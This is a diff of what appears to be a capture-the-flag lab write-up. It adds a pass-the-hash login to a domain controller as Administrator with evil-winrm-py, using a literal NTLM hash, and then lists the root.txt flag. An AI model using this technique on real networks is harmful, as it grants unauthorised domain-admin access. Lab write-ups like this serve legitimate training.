@@ -601,8 +601,35 @@ SMB         10.129.81.48    445    DC01             checkpoint\administrator
 Domain admin!
 
 ```python
+evil-winrm-py -i dc01.checkpoint.htb -u 'Administrator' -H 'f29e9c014295b9b32139b09a2790be3b'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
 
+[*] Connecting to 'dc01.checkpoint.htb:5985' as 'Administrator'
+evil-winrm-py PS C:\Users\Administrator\Documents>
 ```
+
+I can then login as the DA
+
+```python
+evil-winrm-py PS C:\Users\max.palmer\Desktop> dir
+
+
+    Directory: C:\Users\max.palmer\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+-ar---        10/28/2026   4:33 PM             34 root.txt                                                              
+
+
+evil-winrm-py PS C:\Users\max.palmer\Desktop>
+```
+
+The other domain admin has t
 
 
 
